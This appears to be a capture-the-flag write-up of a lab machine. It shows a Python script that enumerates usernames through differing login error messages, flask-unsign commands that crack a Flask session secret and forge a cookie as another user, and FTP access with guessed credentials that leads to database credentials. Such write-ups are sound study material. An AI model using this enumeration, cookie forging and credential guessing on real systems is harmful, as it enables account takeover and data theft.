Can brute force usernames through the login page -> error messages differ based on if a username is correct or not
```python
# script for bruteforcing usernames through the login page

#!/usr/bin/python3

import requests

url = 'http://10.10.11.160:5000/login'
f = open('/opt/SecLists/Usernames/cirt-default-usernames.txt', 'r')
proxy = { 'http' : 'http://localhost:8080' }

for i in f.readlines():
    name = i[:-1]
    data = { 'username':name, 'password':'p' }
    r = requests.post(url,data=data,proxies=proxy)
    if 'Invalid login' in r.text:
        print(name)
```
Script returns a few usernames -> note that I created the 'admin' user but not the others
```
ADMIN
Admin
admin
blue
```
Use the tool from ```https://github.com/Paradoxis/Flask-Unsign``` to crack the secret used for signing the session cookies
```bash
flask-unsign --unsign --cookie 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW4ifQ.YoaPAg.csHupjFKPgF8jE03sjpnLOBD3iI'
[*] Session decodes to: {'logged_in': True, 'username': 'admin'}
[*] No wordlist selected, falling back to default wordlist..
[*] Starting brute-forcer with 8 threads..
[*] Attempted (2176): -----BEGIN PRIVATE KEY-----***
[+] Found secret key after 17152 attemptsSecret!CToOd
'secret123'
```
Use the secret to impersonate the users that were enumerated earlier
```bash
flask-unsign --sign --cookie "{'logged_in': True, 'username': 'blue'}" --secret 'secret123' 
eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.YoaPtQ.rF666b7Wb6nE_c_0fJPJEd1TZM8
```
Find a note for this user with some ftp creds
![[Pasted image 20220519134356.png]]
This user's ftp doesn't have much interesting -> try to login as ftp_admin with same password scheme ```ftp_admin:ftp_admin@Noter!```
```bash
ftp 10.10.11.160
Connected to 10.10.11.160.
220 (vsFTPd 3.0.3)
Name (10.10.11.160:hrevans): ftp_admin
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||17487|)
150 Here comes the directory listing.
-rw-r--r--    1 1003     1003        25559 Nov 01  2021 app_backup_1635803546.zip
-rw-r--r--    1 1003     1003        26298 Dec 01 05:52 app_backup_1638395546.zip
226 Directory send OK.
ftp>
```
Unzip the newest backup and check out app.py for db creds:
```python
# Config MySQL
app.config['MYSQL_HOST'] = 'localhost'
app.config['MYSQL_USER'] = 'DB_user'
app.config['MYSQL_PASSWORD'] = 'DB_password'
app.config['MYSQL_DB'] = 'app'
app.config['MYSQL_CURSORCLASS'] = 'DictCursor'
```
